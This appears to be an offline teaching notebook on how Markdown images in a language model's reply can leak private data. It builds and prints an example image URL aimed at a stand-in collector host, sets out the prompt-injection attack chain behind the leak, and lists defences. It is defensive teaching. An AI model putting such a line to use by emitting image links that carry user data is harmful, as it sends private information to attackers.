# Module 307 — Markdown-Based Exfiltration Concepts

This offline worksheet explains how a rendered Markdown image or link can cause a browser or preview service to make an external request. It uses only fictional sample text, prints a non-routable `.invalid` URL, and never sends a request or renders the Markdown as an image.

**Core idea:** if private context is placed in a generated URL and a renderer fetches that URL, the destination may receive the data in its request log.

## 1. Read the parts of a URL

In `https://collector.example.invalid/pixel?sample=demo`, `https` is the scheme, `collector.example.invalid` is the host, `/pixel` is the path, and `sample=demo` is a query parameter. The `?` starts the query string; `&` separates additional parameters. The `.invalid` domain is reserved for examples and should not resolve to a real service.

In [ ]:
from urllib.parse import urlencode

# Fictional placeholder, never a real message or secret.
sample_text = 'demo & key=value?'

# Replacing only spaces fails to encode URL delimiters.
naive_value = sample_text.replace(' ', '+')

# urlencode encodes reserved characters as data in one parameter.
safe_query = urlencode({'sample': sample_text})
example_url = 'https://collector.example.invalid/pixel?' + safe_query

print('Naive value:', naive_value)
print('Encoded query:', safe_query)
print('Non-routable example URL:', example_url)

## 2. Why an image reference can leak data

Markdown syntax `![description](URL)` asks the renderer to show an image from a URL. The browser may make an HTTP request to fetch that image. If the URL contains private context as a query value, the remote server can receive and log it. This is a network side effect caused by rendering; it does not require JavaScript. The code below constructs only plain text for analysis and does not create a Markdown image or fetch the URL.

In [ ]:
markdown_example = f'![demo](https://collector.example.invalid/pixel?{safe_query})'
print('Markdown as inert text:', markdown_example)
print('No browser request was made by constructing this string.')

## 3. Exam review and defensive questions

Attack chain: private context is available to the model; attacker-controlled content influences the model; the response contains a remote image/link with data; a browser or preview fetches it; the destination logs the request.

Ask: What sensitive information can the model access? Can an attacker influence the response indirectly? Does rendering auto-fetch remote content? Can generated links be previewed automatically?

Defend by limiting context and per-user access, disabling remote images when possible, applying strict origin controls or a privacy-preserving proxy, and preventing automatic fetching of arbitrary links. Do not rely on the model refusing. This notebook sends no network requests.